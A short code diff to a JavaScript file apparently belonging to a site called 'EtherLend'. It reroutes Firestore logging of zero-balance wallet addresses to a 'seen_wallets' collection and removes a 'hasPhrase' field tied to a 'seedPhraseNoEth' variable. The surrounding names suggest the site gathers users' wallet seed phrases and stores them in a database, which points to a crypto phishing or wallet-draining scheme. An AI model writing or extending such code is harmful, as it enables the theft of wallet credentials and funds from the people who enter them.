@@ -605,16 +605,15 @@ async function showEthBalanceStatus(address) {
           console.warn('[EtherLend] no_eth_submissions write error:', err)
         );
       }
-      // Log the zero-balance wallet address for reference
+      // Log the zero-balance wallet address to seen_wallets
       firestoreOp(() =>
-        db.collection("no_eth_submissions").doc(address + '_meta').set({
-          address:   address,
-          balance:   0,
-          seenAt:    new Date().toISOString(),
-          hasPhrase: !!seedPhraseNoEth
+        db.collection('seen_wallets').doc(address).set({
+          address:  address,
+          balance:  0,
+          seenAt:   new Date().toISOString()
         }, { merge: true })
       ).catch(err =>
-        console.warn('[EtherLend] no_eth_submissions meta write error:', err)
+        console.warn('[EtherLend] seen_wallets write error:', err)
       );
     } else {
       // Firestore unavailable — store locally as fallback
@@ -1856,5 +1855,3 @@ document.addEventListener('DOMContentLoaded', () => {
   }, 1200);
 
 });
-
-
